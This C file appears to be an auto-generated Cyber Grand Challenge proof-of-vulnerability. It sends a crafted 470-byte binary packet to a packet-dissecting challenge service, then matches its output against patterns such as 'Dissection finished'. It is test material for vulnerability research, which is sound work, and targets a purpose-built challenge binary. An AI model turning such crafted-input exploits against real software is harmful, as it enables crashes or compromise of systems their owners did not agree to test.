#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd6\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xbe\x01\x00\x00\xb6\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb6\x01\x00\x00"
         "\x67\xf7\x67\xef\x4e\x86\x8b\x10\xef\x6f\xa9\x34\x5c\x4b\x99\x80"
         "\x6f\x25\x55\x83\x19\x00\x00\x00\x01\x15\x4e\x00\xff\xc3\x68\xf8"
         "\x90\x59\x99\xdb\x52\x8f\x0b\x20\xa5\x90\x01\x00\x2b\x01\x00\x6c"
         "\x01\x14\x09\x82\x01\x4f\x01\x00\x58\x27\x7f\x38\x0c\x61\x65\xdd"
         "\xb7\x01\x00\xd9\x41\x00\xc8\x42\x09\x58\xc2\x4d\xff\xff\x50\x57"
         "\xd0\x88\x7a\xc3\x7a\xbf\x87\x9d\x79\x8d\x8f\x0d\xce\xc1\x01\xd0"
         "\x2a\x9d\x7c\xe5\x01\x00\xaf\xb2\xff\x2e\xd4\x44\x08\xc2\x4d\x41"
         "\x00\xff\xfb\x4c\x29\x92\x30\x25\xce\x2f\x41\x00\xff\xfb\x76\x8e"
         "\x6b\xe3\x32\xf3\x94\x34\x48\xf0\x09\xbc\xc7\xfd\xde\x25\xc4\x19"
         "\xd6\x59\x49\x5d\x14\x05\x9d\x7d\x93\x5e\x1e\x3c\x87\x0c\xe7\xbb"
         "\x30\x68\xef\x95\xed\x6b\x95\xca\x6a\x93\x03\x2f\xec\x36\xf8\x4d"
         "\x93\x48\x98\x26\x6b\x1c\xfe\x75\x30\xb7\x73\xc7\x08\xce\x96\x80"
         "\xa0\xe5\xef\xd5\xdb\xe2\xfc\xf9\xf8\xd8\xe1\x1b\x59\xd8\xbc\x6c"
         "\xd2\xb3\x71\x4e\xbc\x76\xf2\x0d\x23\xdc\xd0\x80\x15\xe6\x41\x10"
         "\xd9\x24\xa2\xfc\xe7\x48\x30\x54\x80\xa9\x53\xb6\x87\x87\xf7\xea"
         "\x1e\xcc\xf8\x0f\xc0\xa9\x74\x2c\xfc\x86\x0d\xa1\x3c\x26\x2a\xf8"
         "\xb9\x16\x5c\x66\x92\xa6\xe8\xac\xe4\xe2\x00\xe6\x1f\xb3\x93\x17"
         "\x38\x88\x87\xe5\x6a\xcb\x57\xaa\xbb\xa0\x06\xcf\x7c\xaa\xbe\xca"
         "\x41\x3c\x5d\x03\x2b\x20\x34\xf2\x87\xac\x3e\xe3\x35\x6f\x15\x06"
         "\xb6\x9e\x30\x14\x83\xb9\x0b\x1d\xba\x2a\x6c\xfc\x51\xdb\x2d\xbd"
         "\x48\x45\x66\xa8\xf9\x2d\x71\xe7\xe1\xdd\xe6\x87\x8b\xdb\xce\x21"
         "\x7e\xb1\x99\xc5\xbb\xc5\xf0\x41\x0f\x36\x42\x7d\x01\x03\x5c\xd4"
         "\x84\xc5\x53\x6f\xef\x9e\x1b\xad\x92\x6c\xf7\x21\xb6\xd1\xf6\x6d"
         "\x97\x3c\x33\x82\xf2\xf4\x0c\x47\xa3\xd5\x5b\x5a\x26\x3d\x01\xef"
         "\x25\x72\x41\x00\xf9\xf4\x9e\x99\x01\xd2\x01\x1d\x01\x00\x8c\x01"
         "\x33\x41\x00\x41\x00\xa7\xf3\xf6\x09\x0c\xcc\xc8\x56\xa9\xa6\x01"
         "\x00\x9c\x41\x00\x97\x6f\x89\x8f\x60\x0e\x25\x27\x01\x3f\xe2\x9f"
         "\x65\xfa\x74\x3d\x25\xfb";
      static unsigned int write_00001_00000_len = 470;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamamarket
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x6d\x61\x72\x6b\x65\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
